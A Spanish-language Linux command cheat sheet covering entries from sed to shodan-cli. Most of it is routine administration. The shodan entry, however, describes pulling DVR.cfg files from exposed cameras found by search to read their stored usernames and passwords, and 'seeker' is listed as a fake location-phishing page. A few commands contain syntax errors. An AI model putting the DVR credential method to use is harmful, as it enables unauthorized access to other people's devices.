$ sed = fichero.txt | sed 'N;s/\n/\t/' (Numerar lineas [ como cat -n archivo])
$ find . -type f -exec sed -i -e 's/esto/aquello/g' {} \; (Reemplazar una cadena "esto" por "aquello" en muchos archivos)
$ find . -type f -exec -name '*.txt' sed -i -e 's/esto/aquello/g' {} \; (Lo mismo pero sólo en archivos txt)
$ find . -type f -exec sed -i -e '/casa/d' {} \; (Eliminar todas las lineas que coincidan la palabra "casa")
$ find . -type f -exec -name '*.txt' sed -i -e '/pattern/d' {} \; (Lo mismo pero sólo en archivos.txt)
$ sed -i "s|esto|aquello|' archivo.txt (Reemplazar "esto" por "aquello" de forma real en archivo.txt)
$ sed -i 's/localhost\/tractatus/localhost\/emacs/g' *.html (En todos los archivos html del directorio)
$ echo " href=http://localhost/tractatus/2ping.html" | sed 's/localhost\/tractatus/localhost\/emacs/' (Cuando existen barras entre palabras han de escaparse)
$ echo "la casa es casa de todos los sin casa" | sed 's/casa/piso/2' (Substituir la segunda coincidencia de cada linea)
$ echo "la casa, una casa, se casa, gran casa, no casa, la casa, se casa, mas casa" | sed 's/casa/pìso/3g' (Reemplaza desde la tercera coincidencia a la última de cada linea)
$ echo "Linux es un Sistema Genial" | sed 's/\(\b[A-Z]\)/\(\1\)/g' (Poner entre parentesis la primera letra de cada palabra que empieza por mayuscula)
$ cat ab.html |  sed -n '5 s/#/ /p' (Reemplazar solo en la 5ª linea el caracter "#" por un espació)
$ sed '2~2 w texto2.txt' texto.txt (Escribe la 2 linea de texto.txt en el archivo texto2.txt borrando su contenido)
$ sed -i '/plantilla/G' listado.txt (Insertar linea en blanco despues de un patron [plantilla en este caso])
$ sed -i '/plantilla/{x;p;x;}' listado.txt (Insertar una linea en blanco antes de un patron [plantilla en este caso])
$ sed -i '/plantilla/{x;p;x;G;}' listado.txt (Insertar una linea en blanco antes y dispues de aparecer un patron [plantilla])
$ sed = listado.txt | sed 'N;s/\n/\t/' > listado-numerado.txt (Añadir número de linea al principio de cada una)
$ sed '/./=' listado.txt | sed '/./N; s/\n/- /' > listado-numerado.txt (Añadir número de linea al principio si no está en blanco)


see
Forma de visualizar imagenes con imagemagic.
$ see image.jpg


seeker
Crea una página falsa que solicita la ubicación del usuario.
# seeker (entra en modo interactivo)


select
Realiza menús de forma rápida y simple:
Algunos ejemplos:
1.-
	#!/bin/bash
	OPCIONES="Uso_linux Todavía_estoy_con_windows"
	select opt in $OPCIONES; do
		if [ "$opt" = "Uso_linux" ]; then
			echo "Bravo, usas el mejor sistema..."
			exit
		elif [ "$opt" = "Todavía_estoy_con_windows" ]; then
			echo "¡Evoluciona de una vez!"
			exit
		else
			echo opción errónea
		fi
	done
2.-
	#!/bin/bash
	OPCIONES="hostname pwd exit"
	select opt in $OPCIONES; do
		if [ "$opt" = "hostname" ]; then
			echo $HOSTNAME
		elif [ "$opt" = "pwd" ]; then
			pwd
		elif [ "$opt" = "exit" ]; then
			echo "salir"
			exit
		else
			echo opción errónea
		fi
	done
3.-
	#!/bin/bash
	PS3='Elija una opción : '
	options="linux win salir"
	echo opciones : $options
	select opt in $options
	do
    	if [ "$opt" = "salir" ]; then
        	echo "Salgo..."
        	exit
    	elif [ "$opt" = "linux" ]; then
        	echo "Muy bien..."
    	else
        	echo "Terriblemente mal..."
    	fi
	done


select-default-ispell
Selecciona el diccionario ispell predeterminado.
# select-default-ispell


select-default-wordlist
Indica a qué lista de palabras debe apuntar el enlace simbólico "/usr/share/dict/words". Esto proporcionará una lista simple de palabras del diccionario para la corrección ortográfica básica y las búsquedas de palabras.
# select-default-wordlist


select-editor
Proporciona un mecanismo coherente para seleccionar y almacenar un editor sensible preferido por el usuario.
$ select-editor (Muestra los instalados y marca el predeterminado. Solicita el número del que se desea)


selinux
[selinux-basics selinux-policy-default]. SELinux proporciona una forma de acceso a recursos basada en políticas de control de acceso obligatorio [mandatory access control, MAC] incorporado en el kernel. Existen un conjunto de reglas de autorización [políticas] las cuales determinan si una operación sobre un objeto [Archivos, directorios, dispositivos...] realizada por un sujeto esta o no permitida basándose en los atributos de ambos. Linux utiliza por defecto el control de acceso a discreción [discretionary access control, DAC] basada en los propietarios y grupos a los que pertenece un objeto en los que un usuario normal puede cambiar los permisos de los archivos que posee con el comando chmod. Con selinux se limita el acceso que tienen las aplicaciones a otras aplicaciones y a los ficheros, impidiendo que un proceso pueda modificar cualquier fichero del usuario con el que se lanzó. En DAC el acceso esta descentralizado, siendo el propietario de cada objeto el encargado de asignar los permisos de los diversos grupos que accederán a ellas. En cambio con el MAC los objetos y los sujetos tan solo tienen atributos, pero son las políticas las que se encargan de autorizar o denegar una acción. Ver comandos getsebool y setsebool.
Los módulos SELinux disponibles se almacenan en el directorio /usr/share/selinux/default/.
# semodule -i módulo.pp (habilitar un módulos en la configuración actual. La extensión pp significa paquete de política [«policy package»]).
# semodule -r módulo (Elimina un módulo de la configuración actual)
# semodule -l (Enumera los módulos habilitados actualmente)
# semanage login -a -s staff_u juan (mapear una cuenta a un usuario especifico de SELinux)
# restorecon -R -F /home/juan (etiquetar los ficheros del usuario mapeado juan)
# semanage user -l (enumera las asociaciones entre las identidades de usuario de SELinux y los roles permitidos)
# semanage login -d juan (elimina la asociación asignada al usuario juan)
# semanage login -m juan (Modificar la asociación asignada al usuario)
# semanage login -l (enumera las correspondencias actuales entre identificadores de usuarios y entidades SELinux)
tabla de los usuarios estándar SELinux disponibles:
	user_u 	(Usuario normal que se utilizan para cuentas de usuario que no van a ser empleadas para administrar ningún servicio del sistema)
	staff_u (Para administradores con derechos para conmutar roles y ganar privilegios elevados)
	root (Cuenta root ligeramente diferente de la cuenta staff_u. Los ficheros protegidos por control de acceso basado en root no pueden ser gestionados por los staff_u)
	sysadm_u (Administración del sistema. Por defecto, esta cuenta no se utiliza inmediatamente ya que este usuario obtiene de forma inmediata el rol administrativo (por lo que staff_u y root todavía necesitarán conmutar roles).
	system_u (administrar servicios. Nunca se debe utilizar para usuarios finales ya que ofrece acceso directo al rol del sistema)
	unconfined_u 	Usado cuando la directriz es targeted, este usuario SELinux tiene muchos privilegios (esencialmente no está limitado en sus acciones, aunque todavía se gestiona través de SELinux con una directriz "muy abierta").
1.-
Activar SELinux en Debian
Tener los paquetes básicos instalados
# apt install selinux-basics selinux-policy-default auditd policycoreutils selinux-utils
"auditd" es opcional pero muy recomendable. Es el que registra los eventos de seguridad y los logs que luego permiten analizar qué bloqueó SELinux.
$ sestatus (comprobar el estado actual)
  	   SELinux status:                 disabled
$ getenforce (lo mismo)
  	   Disabled
Configurar el archivo principal de SELinux
$ sudo nano /etc/selinux/config
       SELINUX=permissive
       SELINUXTYPE=default
"permissive" significa que registrará los bloqueos pero no los aplicará, ideal para observar sin romper nada.
Activar SELinux en el kernel
$ sudo nano /etc/default/grub
En la línea que empieza por "GRUB_CMDLINE_LINUX_DEFAULT", añadir los siguientes parámetros al final:
           GRUB_CMDLINE_LINUX_DEFAULT="quiet splash security=selinux selinux=1"
# update-grub (actualizar la nueva configuración)
El sistema de archivos necesita etiquetas SELinux. Crear el marcador para que se genere automáticamente en el siguiente arranque:
# touch /.autorelabel
# reboot (reiniciar)
El primer reinicio puede tardar bastante, dependiendo del tamaño del disco ya que está reetiquetando todo el sistema.
$ nano /var/log/audit/audit.log (analizar los logs y ver fácilmente las violaciones aunque no bloquean nada en modo permissive)
$ sestatus
  	 SELinux status:                 enabled
	 ...
2.-
Forma simple de activar selinux
# apt install selinux-basics selinux-policy-default auditd
# selinux-activate (se encarga de los pasos de configuración básicos)
# reboot


selinux-utils
SELinux (Security-Enhanced Linux) es un mecanismo de control de acceso obligatorio [MAC] desarrollado por la NSA y la comunidad open source. En lugar de basarse solo en los permisos tradicionales de Unix [propietario, grupo, otros], SELinux [ver] añade una capa de políticas de seguridad que controlan qué puede hacer cada proceso con cada recurso [ficheros, sockets, puertos, etc.]. Incluye las aplicaciones avcstat, compute_av, compute_create, compute_member, compute_relabel, getconlist, getdefaultcon, getenforce, getfilecon, getpidcon, getpidprevcon, getpolicyload, getsebool, getseuser, matchpathcon, policyvers, sefcontext_compile, selabel_compare, selabel_digest, selabel_get_digests_all_partial_matches, selabel_lookup, selabel_lookup_best_match, selabel_partial_match, selinux_check_access, selinux_check_securetty_context, selinuxenabled, selinuxexeccon, setenforce, setfilecon, togglesebool y validatetrans.
# getenforce (saber si esta activo selinux)
# getsebool -a (mostrar todas las politicas si estan o no activas. Ver comando getsebool)


sendmail
[libnet-ssleay-perl libio-socket-ssl-perl]. Herramienta que permite enviar correos a partir de un servidor externo (p.g gmail). El principal inconveniente es que la contraseña queda expuesta en texto plano en la terminal.
$ sendmail -f nombrecuenta@gmail.com -t destinatario@hotmail.com -s smtp.gmail.com:587 -u "Asunto" -m "Cuerpo del mensaje" -a archivo_adjunto -v -xu nombrecuenta -xp clavecuenta -o tls=yes
	Nota.- Tanto el asunto como el Cuerpo del mensaje entre comillas
Si queremos poner más destinatarios, separar los correos con punto y coma [;]:
	-t usuario1@hotmail.com;usuario2@gmx.es;usuario3@gmail.com
Algunas opciones:
-cc usuario5@tml.org
-bcc usuario6@tml.org
-a archivo.pdf


sensible-utils
Varios programas para seleccionar un navegador, editor o paginador.
$ select-editor (muestra los editores disponibles  para seleccionar el deseado)
$ sensible-browser (abre el navegador presdeterminado)
$ sensible-editor (abre el editor predeterminado)
$ sensible-pager (abre como less u archivo de texto)


sensors
[lom-sensors]. Mostrar las lecturas de todos los sensores de temperatura de los chips.
$ sensors (forma básica)
$ sensors -A (No mostrando el adaptador para cada chip)
$ watch -n1 sensors (ver temperatura de las CPUs)


sensors-conf-convert
[lm-sensors]. El propósito de esta herramienta es convertir sensors.conf del formato lm_sensors versión 2 al formato lm_sensors versión 3. El archivo de configuración antiguo se lee desde la entrada estándar y el nuevo se escribe en la salida estándar.
# sensors-conf-convert < /etc/sensors.conf > /etc/sensors3.conf


sensors-detect
[lm-sensors]. Monitorizar temperatura y voltage.
$ sensors
$ sensors -f (Muestra la temperatura en grados Fahrenheit)


seq
Crea secuencias de números.
$ seq 7 12 (entre el 7 y el 12)
$ seq 7 2 12 (entre el 7 y el 12 con un incremento de 2 en 2)
$ seq -w 7 12 (entre el 7 y el 12 con el mismo tamaño)
$ seq -s_ 7 12 (con un guión bajo entre cada número)
$ seq -s'#' 0 $(tput cols) | tr -d '[:digit:]'  (Escribe una raya de “#” en toda la anchura de la terminal)


service
Inicia o para servicios.
# service apache2 start (Arranca apache2)
# service apache2 stop (Para apache2)
# service apache2 restart (Reinicia apache2)
# service --status-all (servicios de un sistema en ejecución y en listen)
# service --status-all | grep + (los que estan en ejecución)


sestatus
Devuelve el estado de SELinux y la política que se está usando. Ver selinux y getsenforce
# sestatus
# sestatus -v (estado detallado de un sistema ejecutando SELinux)


set
desplegar todas las variables [y sus valores] que el shell controla y otorgar nuevas variables.
$ set -o (listado de todas las variables y si estan o no activadas)
Algunas ejemplos que se muestran en la salida:
$ set -o ignoreeof (evitar que la terminal se cierre al presionar Control-D)
$ set -o noglob (desactivar caracteres especiales en la shell: ?, [, ], * y ~)
$ set prompt = "%/ - %t - %u - $$$$" (que el prompt diga el directorio, la fecha, el usuario i sigan 4 signos de "$")
$ set history=2000 (que el historial guarde los últimos 2000 comandos entrados)
$ set -o vi (cambiar a las teclas del modo de edición de vi . Por defecto bash utiliza el modo emacs)
$ set -o noclobber (activar la protección de sobreescritura en las tuberias si el archido ya existe [ver noclobber] )
$ set +o noclobber (Desactivar la protección. Opción por defecto)
$ set -euo pipefail ("-e" detiene el script ante cualquier error, "-u" previene el uso de variables no definidas y "-o pipefail" asegura que los pipelines fallen completamente si cualquier parte falla)
1.-
Depurar partes de un script encerrando el código:
	set -x
	código a depurar
	set +x


setarch
Esta utilidad le dice al núcleo que informe de una arquitectura diferente a la actual a un programa, luego ejecutará dicho programa en este entorno.
$ setarch --list (Listado de arquitecturas posible)
$ setarch $(uname -m) --uname-2.6 script.sh (A partir de este momento, siempre que se llame a ese script pensará que se está ejecutando con un kernel 2.6)


setcap
Permite asignar permisos especiales para que una aplicación se pueda ejecutar en un puerto por debajo del 1024 por un usuario sin permisos de administrador. [relacionada con getcap]
# setcap cap_net_raw+ep /usr/bin/ping (dar los permisos)
# setcap -r /usr/bin/ping (quitarlos)
$ setcap cap_net_bind_service-ep /usr/bin/ping (otra forma de quitarlos)
$ setcap cap_net_admin,cap_net_raw+ep /usr/bin/wireshark (otorgar dos capabilitys)
Nota.- +ep significa que la capability es efectiva [e] y permitida [p].


setfacl
Establece, modifica o elimina la lista de control de acceso a un archivo.
$ setfacl -m u:usuario:rx archivo (Conceder acceso de lectura y ejecución a un usuario sobre un archivo)
$ setfacl -x u:usuario file (Eliminar el acceso a un archivo a un usuario)
$ setfacl -b archivo (elimina toda la lista de control de acceso a archivo)
$ setfacl -d -m u::rw archivo  (Modifica la lista de control de acceso por defecto de archivo para todos los usuarios)
$ setfacl -a archivo (muestra la lista de control de acceso de un archivo)
$ getfacl -d archivo (ver la lista de control de acceso por defecto)
$ getfacl -R dir (lista el control de acceso a todos los archivos,  directorios y subdirectorios del directorio mencionado)


setfont
Modificación de las fuentes en el arranque (arch)
# setfont (cargar la por defecto)
# setfont ter-114f (especificar una)
Nota.- fuentes en /usr/share/consolefonts


setgid
Ejecutar un proceso como el grupo que posee el archivo.
        $ ls -l /usr/bin/crontab
        -rwxr-sr-x 1 root crontab 43648  2 de març   2023 /usr/bin/crontab
Donde se observa que los permisos del grupo son "r-s" en lugar de "r-x".


setleds
Controla los leds del teclado
$ setleds -D +num >> /dev/tty1  (activa el teclado numérico)
$ setleds -D -caps >> /dev/tty1 (desactiva las mayúsculas)
$ setleds -D +scroll >> /dev/tty1 (activa el scroll)


setlogcons
Enviar mensajes del kernel a la consola especificada.
# setlogcons 1 (enviar todos los mensajes del kernel a tty1)


setools
Parche del kernel de Linux y una serie de utilidades con funcionalidad de seguridad mejorada diseñadas para agregar controles de acceso obligatorios a Linux. Son herramientas para analizar la política de seguridad en sistemas SELinux. Incluye las siguientes aplicaciones: sechecker [Análisis automatizado basado en archivos de configuración], sediff [Comparar dos políticas para encontrar diferencias], sedta [Realizar análisis de transición de dominio], seinfo [Enumere los componentes de la política], seinfoflow [Realizar análisis de flujo de información] y sesearch [Reglas de búsqueda (permitir, type_transition, etc.)].


setpci
[pciutils]. Utilidad para consultar y configurar dispositivos PCI.
# setpci --dumpregs (lista de todos los registros y capacidades PCI conocidos)


setsebool
Permite activar/desactivar las políticas en selinux. Ver getsebool
# setsebool httpd_can_network_connect on (Activamos el permitir a Apache realizar conexiones de red)
# setsebool -P httpd_can_network_connect on (Hacer el cambio persistente)
# setsebool httpd_disable_trans 1 (Otra forma de desactivar una politica. Con 0 se activa)


setserial
Establecer y/o reportar la información de configuración asociada con un puerto serie. Esta información incluye qué puerto de I/O y qué IRQ está utilizando un puerto serie particular.
$ setserial -G /dev/ttyS0


setsid
Permite continuar ejecutando un comando aunque se cierre la terminal o la sesión ssh. Parecido a nohup [ver] o screen [ver] aunque a diferencia de estos, no permite volver para ver el estado de proceso.
$ setsid apt-get update


setterm
Modificación de los atributos de la terminal. Algunos flags solo son aplicables a las tty.
$ setterm -r   (La resetea incluso si ha quedado colgada)
$ setterm -cursor off (desaparece el cursor. Con "on" regresa de nuevo)
Opciones:
-foreground green (Color de texto. [black|blue|green|cyan|red|magenta|yellow|white|default])
-background red  (Color de fondo)
-inversescreen on (Intercambia los colores del texto y el fondo)


setuid
Configuración de permisos de un archivo que permite a un usuario ejecutar ese archivo o programa con el permiso del propietario de ese archivo
              $ ls -l /usr/bin/sudo
              -rwsr-xr-x 1 root root 281624 27 de juny   2023 /usr/bin/sudo
Donde se observa que en los permisos del usuario root, son "rws" en lugar de "rwx" y que es ejecutable por todo el mundo por la última "x'"en los permisos. La "s" que sustituye a la "x" indica que cuando un usuario ejecuta este programa, el sistema operativo ejecutará ese archivo no como el usuario que lo ejecuta, sino como el usuario root. Si la "s" fuera mayúscula [S] significa que el usuario que posee el archivo no tiene permisos de ejecución. Podemos agregar ese permiso usando el comando
# chmod u+x archivo


setxkbmap
Configurar teclado [para X.org] en la sesión actual.
$ setxkbmap -layout es
$ setxkbmap es (configurarlo en español)
$ setxkbmap -query (ver la configuración actual)


sexy-bash-prompt
Prompt para bash que también puede usarse para status y ramas en git. Utiliza tput, un programa para configurar terminales usadas por la shell. Antes de la instalación es preciso hacer copia de seguridad de .bashrc ya que la instalación de este paquete crea una archivo a su medida.
$ cp ~/.bashrc ~/.bashrc_old
Instalación y descarga:
$ git clone https://github.com/twolfson/sexy-bash-prompt
$ cd sexy-bash-prompt
# make intall
$ source ~/.bashrc
Terminada la relectura de .bashrc, veremos los cambios al abrir una terminal.


sfdisk
Mostrar un listado de las particiones con sus características exactas.
# sfdisk -d /dev/sda (Muestra la tabla de particiones de sda)
# sfdisk -d /dev/sda | sfdisk /dev/sdb (copia la tabla de sda a sdb)
# sfdisk -d /dev/sda > tabla.bak (Guardar tabla de particiones)
# sfdisk /dev/sda < tabla.bak (Restaurar tabla de particiones)


sfeed
Analizador RSS y Atom y algunos programas de formato. Convierte fuentes RSS o Atom de XML a un archivo separado por TAB. Se incluyen programas de formateo para convertir este formato separado por TAB a varios otros formatos. También se incluyen algunos programas y scripts para importar y exportar OPML y para buscar, filtrar, fusionar y ordenar elementos del feed. Incluye las aplicaciones: sfeed_atom, sfeed_content, sfeed_curses, sfeed_frames, sfeed_gopher, sfeed_html, sfeed_markread, sfeed_mbox, sfeed_opml_export, sfeed_opml_import, sfeed_plain, sfeed_twtxt, sfeed_update, sfeed_web y sfeed_xmlenc
$ mkdir -p "$HOME/.sfeed/feeds" (crear el directorio)
$ sfeed_opml_import < file.opml > "$HOME/.sfeed/sfeedrc" (importar el listado de feeds)
$ sfeed_update (actualizar feeds)
$ sfeed_plain $HOME/.sfeed/feeds/* > "$HOME/.sfeed/feeds.txt" (exportar los feeds en formato txt)
$ sfeed_curses ~/.sfeed/feeds/* (lanzar el lector)


sfill
[paquete secure-delete]. Borrado de todos los rastros de datos del espacio libre del disco. Parecidos parámetros de srm [ver]. Sobreescribe 38 veces el espacio.
# sfill -f dir (Borrado rápito pero inseguro)
# sfill -l dir (Como lanzar dos veces sfill -f)
# sfill -i dir (Borrar solamente inodos en directorio)
# sfill -zv dir (Sobreescribiendo ceros en el último borrado y mostrando el proceso)


sftp
Transferencia encriptada de archivos entre computadoras por ssh.
Ajustes previos:
# nano /etc/ssh/sshd_config
Y colocar las lineas:
	Subsystem sftp internal-sftp
	Match group USER
	 ChrootDirectory /home/USER
	 ForceCommand internal-sftp
	 AllowTCPForwarding no
	 X11Forwarding no
$ sftp USER@host


sg
[sg3-utils]. Identificar dispositivos /dev concectados
# sg_scan -i
# sg_map -i


sgpt
Es utilizado para realizar una sola consulta rápida con ChatGPT en el terminal. Este comando es útil cuando necesitas una respuesta breve o ejecutar una tarea simple.
$ sgpt "¿Cuál es la capital de Rumania?"
$ sgpt "Explícame brevemente qué es una tabla hash en programación"


sh
Interprete de comandos.
$ sh -x script (ejecutará el script y mostrará todas la sentencias que se ejecutan con las variables y comodines ya expandidos)
$ sh -n script (Chequea la sintaxis sin ejecutar el script. Si no encuentra errores devuelve vacio)
$ sh -e script (Obliga a terminar el script aunque algún comando falle)
$ sh -v script (Imprime las lineas de entrada según se leen)


shadow
[/etc/shadow]. Es el archivo donde se guardan las contraseñas de todos los usuarios del sistema y normalmente se compone del nombre de usuario de la cuenta, seguido del hash del password. Como medida de seguridad, el sistema, después de generar el hash del password, agrega un salt y luego genera un nuevo hash. Este proceso funciona genera un algoritmo en un solo sentido, no hay forma de sacar ni "desencriptar" la contraseña real del hash. La única manera de intentar crackear esta contraseña es por medio de diccionarios o fuerza bruta.
# cat /etc/shadow | grep USER (ver el Hash del usuario "USER")
# cat /etc/shadow | grep -E 'USER|root' (ver el Hash del usuario "USER" y el de root)


shar
[shareutils]. Producir un solo archivo a partir de muchos aunque sean todos distintos [png, html, txt, odtn binarios...]. Si se ejecuta un archivo shar recreará los archivos a partir de los que se generó. Tambien pueden extraerse con la aplicación unshar incluyda en shareutils
$ shar * > datos.shar (empaqueta todos los archivos del directorio en el archivo datos.shar)
Primera forma de extraerlos:
        $ chmod +x datos.shar
        $ ./datos.shar
Segunda:
        S unshar datos.shar


sharness
Biblioteca de shell portátil para escribir, ejecutar y analizar pruebas automatizadas para programas Unix. El catálogo de bibliotecas de software que pueden actuar como productores de TAP [Test Anything Protocol], agrupadas por lenguaje de programación es: Ada, C, C++, C#, Common Lisp, Crystal, Elixir, Erlang, Fish, Forth, Fortran, Gambas, Go, Haskell, Igor Pro, Java, JavaScript, Limbo, Lua, MATLAB, OCaml, Omnis Studio, Pascal, Perl5, Perl6, PHP, Prolog, Python, Ruby, Rust, Sass, Shell, SQL, and TypeScript. El ejemplo del funcionamiento de la aplicación sacado de github y adaptado a Debian es:
$ cat simple.t
  #!/bin/sh
  test_description='Mostrar características básicas de Sharness'
  . /usr/share/sharness/sharness.sh
  test_expect_success 'El éxito se informa así' '
      echo hello world | grep hello '
  test_expect_success 'o así' '
      ip a | grep 192 | cut -d " " -f 6 '
  test_expect_success 'Los comandos están encadenados de esta manera' '
      test x = "x" &&
      test 2 -gt 1 &&
      echo success '
  test_expect_failure 'Esperamos que esto falle' '
      cd /home/inexistente '
  test_done
Despues de darle permisos [chmod +x simple.t], cuando se ejecute [./simple.t] creará el directorio test-results y en su interior el archivo de texto con el resultado.
$ cat test-results
total 4
success 3
fixed 0
broken 1
failed 0
Nota.- "test_expect_success" dice "OK" en caso de éxito o "FAIL" en caso de error. "test_expect_failure" dirá "FIXED" en caso de éxito y "known breakage" en caso de error.


shasum
Muestra el hash sha de un fichero con el objetivo de verificar si se producen cambios.
$ shasum -a 512 -t fichero (Usando el algoritmo de 512 bits. Otras opciones: 32 [por defecto] 224, 256, 384, 512224, 512256)


sha1sum
Calcular el hash sha1 de palabras, archivos o directorios.
$ sha1sum archivo
$ sha1sum (Entra en el prompt y espera una palabra. Una vez terminada de escribir, sin pulsar intro, pulsar dos veces Ctrl+d y nos dará el hash)
$ echo -n "linux es un sistema genial" | sha1sum (A partir de una palabra o frase como tuberia)


shc
Ofuscador que encripta el código de un script. Descargar el script de http://www.datsi.fi.upm.es/~frosal/sources/
Instalación:
# cd shc-3.8.9 (entrar en el directorio descomprimido)
# cp shc-3.8.9.c shc.c (evitar error "No rule to make target `shc.c', needed by `shc'")
# mkdir /usr/local/man/man1 (Crear el directorio man1 para evitar el error de "directorio no existe")
# make install (Pulsar "y" a la pregunta "Do you want to continue")
	***	Installing shc and shc.1 on /usr/local
	***	Do you want to continue? y
	install -c -s shc /usr/local/bin/
	install -c -m 644 shc.1 /usr/local/man/man1/
Uso:
$ shc -f script.sh
Creará 2 archivos nuevos:
script.sh  script.sh.x  script.sh.x.c
El ejecutable es el terminado en .x [script.sh.x] que podrá enviarse y ejecutarse de la forma habitual pero sin poder leer el código fuente.
Nota.- El terminado en .x.c es el script pero en lenguaje C. Puede borrarse sin ningún problema.


shell
Termino usado para referirse al interprete de comandos. Los comandos, cuando se escriben en ficheros ejecutables se denominan shell-scripts o programación shell aunque, mirado estrictamente, no se sean un lenguje de programación. El termino shell hace referencia a un programa particular, el Bourne shell [sh] que es un standard unix y, aunque según las distros pueden incluir distintas shells con más características (bash, ash, csh, ksh, tcsh) todas son compatibles con el bourne shell.


shell2http
Servidor HTTP diseñado para ejecutar comandos de shell.
$ shell2http /ps "ps aux" (crea un servidor HTTP que ejecuta el comando "ps aux" cuando accedes a http://localhost:8080/ps)
$ shell2http /info "uname -a" /uptime "uptime" /echo "echo Linux es un sistema genial" (con multiples parámetros)
$ shell2http -port 9090 /date "TZ="Europe/Berlin" date" (por el puerto indicado y mostrando la fecha en Berlin)
$ shell2http -basic-auth "user5:pass5" /ls "ls Documents" (pide nombre y usuario [user5:pass5] antes de mostrar la ejecución del comando)


shell-genie
Dota la consola de Inteligencia Artificial centrada en responder únicamente preguntas sobre el sistema operativo GNU/Linux y sus comandos. Instalar y configurar:
$ python3 -m venv .venv (crear un entorno virtual en tu ubicación)
$ source .venv/bin/activate (activar entorno virtua)
$ pipx install shell-genie (instalar)
$ shell-genie init (inicializar la herramienta)
Produce varias preguntas:
        Select backend: [openai-gpt-3.5-turbo/free-genie]: free-genie
        Note that this server will store the requested command, OS, and shell version to improve the model. Also, I cannot guarantee that the server will be up and running 24/7.
        Do you want to continue? [y/n]:
        Do you want to continue? [y/n]:
        Do you want to provide feedback about the generated commands to improve the models? [y/n]:
        Is your OS Debian GNU/Linux 12 (bookworm)? [y/n]:
        The following configuration will be saved:
        {'backend': 'free-genie', 'os': 'Linux', 'os_fullname': 'Debian GNU/Linux 12 (bookworm)', 'shell': 'bash', 'training-feedback': True}
Nota.- Si elegimos la opción “openai-gpt3” tendremos que hacernos una cuenta en su página y recuperar la llave API para proporcionarla. Eligiendo la opción “free-genie” podemos disfrutar de la forma gratuita y participar o no a mejorar la herramienta.
$ shell-genie ask "la pregunta que hacemos" (Para preguntar)


shellcheck
Revisión y análisis de código de shell scripts. Realiza una comprobación de estándar POSIX detectando problemas con extensión de variables o variables sin usar, errores de sintaxis o en construccciones lógicas (bucles for/while o condicionales if), fragmentos de código mejorables o cualquier incidencia que pueda ocurrir en dicho código. Es posible que marque falsos positivos, por ejemplo si se usan variables de ambiente y no estan definidas. También está disponible en versión web e incluso como plugin para Atom, Sublime Text, vim o emacs [flycheck] .
$ shellcheck script.sh (Forma básica. Si no muestra nada todo es perfecto)
$ shellcheck -s bash -e SC1003,SC2035 script.sh (especificando el lenguaje y excluir 2 tipos de errores)
Nota.- Los códigos de error generados pueden ser consultados en la Wiki del proyecto (<https://github.com/koalaman/shellcheck>) y por su código en <https://github.com/koalaman/shellcheck/wiki/Directive>


shelltestrunner
Herramienta para probar programas de línea de comandos [o comandos de shell arbitrarios]. Lee pruebas declarativas simples que especifican un comando, alguna entrada y la salida esperada, salida de error y estado de salida.
$ shelltest -c script.sh (mostrando en color las anomalias)
$ shelltest -c dir/* (de todos los scripts del directorio)


shelr
Realizar una grabación de la consola con la posibilidad de subirla a http://shelr.tv. Una vez registrados conseguimos el ID personal. La grabación termina al pulsar Ctrl + d y se almacena en .local/share/shelr/ del usuario o de root. Las medidas de la terminal optimas son 132x43 [lanzar, por ejemplo: lxterminal --geometry=132x43]
$ shelr record (Inicia la grabación despues de solicitar el título)
$ shelr record --sound (Grabar con sonido)
$ shelr list (muestra todos los shellcasts [grabaciones])
$ shelr play ID (Reproduce el especificado en el número ID)
$ shelr dump ID (Volcará la grabación en el directorio actual con extensión .json. Solicita nombre y etiqueta del shellcast)
$ shelr play last (eproduce la última grabación)
$ shelr play archivo.json (Reproduce el archivo volcado)
$ shelr play URL (Reproduce un remoto alojado en shelr.tv)
1.-
Proceso para subir la grabación a shelr.tv:
$ shelr setup 4dbde740509f4591bab88ca2361a269 (Especificar el ID de usuario. Este es ficticio)
$ shelr record (Empezar la grabación)
$ shelr push last (Subirla a shelr.tv)
$ shelr push last --private (Subirla a shelr.tv y mantenerla privada)


shift
En un script, permite desplazar los parámetros, de modo que el valor del 1er parámetro ($1) es reemplazado por el valor del 2do parámetro ($2), el del 2do parámetro ($2) por el del 3er parámetro ($3) y así sucesivamente. Veamos un ejemplo:
	$ mkdir tmp (creamos directorio de trabajo)
	$ cd tmp (entramos en él)
	$ touch {1..5}.txt (creamos varios archivos de texto)
Creamos un script con el siguiente contenido:
	#!/bin/bash
	#
	## Entrar un numero variable de archivos
	## como argumentos y comprimirlos con zip
	i=1
	while [ $# -gt 0 ]; do
	    zip ${1%%.*}.zip $1
	    i=$(($i+1))
	    shift
	done
	echo
Lo ejecutamos con algunos archivos como argumentos.
	./script.sh 1.txt 2.txt 3.txt
Comprobamos el resultado, los borramos:
$ rm *.txt
Y probamos con otro número de argumentos.


shodan
Buscador no de sitios web como google, yahoo o bing, sinó de dispositivos conectados a la red [routers, impresoras, camaras ip...]. Precisa registro con lo que aumenta la cantidad de salidas de las busquedas de 10 [sin registro] a 50.
Opciones generales en la barra de busquedas para usuarios sin cuenta pro:
	apache country:ES (Buscar servidores apache en España)
	apache city:Madrid country:ES (Buscar servidores apache en Madrid - España)
	nginx hostname:.es (Buscar servidores nginx con .es en su hostname)
	proftpd port:21 os:linux (Buscar servidores proftpd especificando puerto y sistema operativo)
	net:18.7.7.0/24 (Buscar en un rango de ips)
	Algunos ejemplos concretos:
	Server:SQ-WEBCAM country:es (Buscar webcams en España)
	netcam country:es (Cámaras ip en España)
1.-
Si lanzamos:
	dvr port:8080
Podemos buscar cámaras web. Una vez clicada la seleccionada de la busqueda, añadir a la ip /DVR.cfg, quedando la url: http://xx.xxx.xx.xx:8080/DVR.cfg, saldrá un archivo DVR.cfg para descargar. Descargarlo y editarlo. Buscar usuario y contraseña en USER1_USERNAME=XXXX y USER1_PASSWORD=XXXX


shodan-cli
Buscador de dispositivos.
# easy_install shodan (instalar paquete)
# shodan init YOUR_API_KEY (Entrar la API. Se encuentra en el perfil de usuario en shodan.com)
# shodan (Muestra las opciones)
# shodan count microsoft iis 6.0 (Muestra número de resultados de la busqueda)
# shodan download microsoft-data microsoft iis 6.0 (Guarda la busqueda en un fichero microsoft-data.json.gz)
# shodan parse --fields ip_str,port,org --separator , microsoft-data.json.gz (Analiza el archivo que se generó con el comando anterior, separando los campos ip, puerto y host con ",")
# shodan search --fields ip_str,port,org,hostnames microsoft iis 6.0 (Generar una busqueda separando los campos especificados)
# shodan host IP (Analiza las vulnerabilidades del host especificado)
# shodan myip (Muestra la propia ip)
